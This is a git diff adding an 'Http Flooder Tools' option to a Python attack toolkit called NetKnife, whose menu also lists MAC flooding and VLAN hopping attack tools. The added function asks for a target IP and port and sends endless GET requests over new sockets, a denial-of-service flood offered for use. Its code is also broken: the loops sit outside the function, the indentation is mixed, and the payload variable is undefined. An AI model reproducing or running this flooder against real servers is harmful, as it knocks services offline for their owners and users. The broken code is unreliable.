@@ -60,6 +60,7 @@ printer ("\033[91m[11]:Live IP And Device scanner")
 printer ("\033[91m[12]:Mac Flooder Tools")
 printer ("\033[91m[13]:Arp Spoofing And Arp Cache Poinsing Attack Detection Tools")
 printer ("\033[91m[14]:Vlan Hopping Attacker Tools(Double Tagging Method)")
+printer ("\033[91m[15]:Http Flooder Tools")
 printer ("\033[91m[99]:Exit In The NetKnife")
 print Fore.GREEN + ("--------------------------------------------------------------")
 
@@ -500,7 +501,53 @@ def VlanHopping():
 	sendp(Packet,iface=iface,count=PacketCount)
 
 
+
+# Http Flooder Tools
+# This tool is used to implement Get Request Http Flooding attacks
 	
+	
+def HttpFlooder():
+	print """
+	
+	dP     dP    dP     dP             88888888b dP                         dP                   
+	88     88    88     88             88        88                         88                   
+	88aaaaa88a d8888P d8888P 88d888b. a88aaaa    88 .d8888b. .d8888b. .d888b88 .d8888b. 88d888b. 
+	88     88    88     88   88'  `88  88        88 88'  `88 88'  `88 88'  `88 88ooood8 88'  `88 
+	88     88    88     88   88.  .88  88        88 88.  .88 88.  .88 88.  .88 88.  ... 88       
+	dP     dP    dP     dP   88Y888P'  dP        dP `88888P' `88888P' `88888P8 `88888P' dP       
+ 	                         88                                                                  
+	                         dP                                                                  
+	
+	
+	
+	"""
+	TargetIP = raw_input("Please Enter The Domain Our IP Address: ")
+	TargetPort = input("Please Enter The Http Port Number: ")
+
+
+
+	def Payload(self):
+	    #Payload For Http Flood
+	    payload = "GET / HTTP/1.0\r\n\r\n"
+while True:
+	try:
+        	HttpFloodSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        	HttpFloodSocket.connect((TargetIP, TargetPort))
+    	except socket.error:
+        	print ("[-]connection refused")
+        	print ("[-]Please Check Internet Connection Our TargetIP And Port")
+
+
+
+while True:
+	try:
+        	HttpFloodSocket.send(bytes(payload.encode("utf-8")))
+    	except socket.error:
+        	print ("[-]connection refused")
+        	print ("[-]Please Check Internet Connection Our TargetIP And Port")
+
+    
+
 	
 	
 
@@ -536,6 +583,8 @@ if __name__ == '__main__':
 		ArpAttackDetector()
 	    if TN == 14:
 		VlanHopping()
+	    if TN == 15:
+		HttpFlooder()
             if TN == 99:
                 break
             #else:
